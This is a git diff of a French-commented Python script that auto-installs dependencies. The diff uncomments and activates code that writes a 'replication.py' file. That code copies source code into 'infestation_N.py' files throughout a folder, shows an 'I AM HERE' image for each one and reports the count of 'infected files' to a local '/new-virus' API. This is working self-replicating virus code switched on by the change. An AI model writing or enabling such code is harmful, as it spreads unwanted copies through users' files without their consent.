@@ -26,6 +26,7 @@ def import_or_install(package):
 # vérifiez et installez les dépendances nécessaires
 import_or_install("opencv-python")
 import_or_install("requests")
+import_or_install("python-certifi-win32")
 
 
 import cv2
@@ -41,11 +42,9 @@ screen_width = root.winfo_screenwidth()
 screen_height = root.winfo_screenheight()
 symbols_folder = "symbols/"
 
-
-"""
-
 with open("replication.py", "w") as f:
     f.write('''
+
 
 
 import cv2
@@ -68,10 +67,10 @@ for i, filename in enumerate(os.listdir(folder_path)):
         # ouvrir le fichier et ecrire le code source
         with open(os.path.join(folder_path, f"infestation_{i}.py"), 'w') as f:
             f.write(source_code)
-            # Chemin d'accès au dossier contenant les images
+            # Chemin d'acces au dossier contenant les images
             images_folder = "I_AM_HERE/"
 
-            # Sélectionnez une image aléatoire à partir du dossier
+            # Selectionnez une image aleatoire a partir du dossier
             image_file = random.choice(os.listdir(images_folder))
             image_path = os.path.join(images_folder, image_file)
 
@@ -80,18 +79,16 @@ for i, filename in enumerate(os.listdir(folder_path)):
             cv2.imshow("I AM HERE", image)
             cv2.waitKey(800)
 
-            # Détruisez la fenêtre d'affichage
+            # Detruisez la fenetre d'affichage
             cv2.destroyWindow("I AM HERE")
-            infected_files_count += 1  # incrémenter le compteur
+            infected_files_count += 1  # incrementer le compteur
 
-# appel de la route API POST avec le nombre de fichiers infectés
-url = "http://localhost:8000/new-virus"
+# appel de la route API POST avec le nombre de fichiers infectes
+url = "https://127.0.0.1:8000/new-virus"
 data = {"infected_files_count": infected_files_count}
 response = requests.post(url, json=data)
 
 ''')
-
-"""
 
 def display_images():
     i = 0
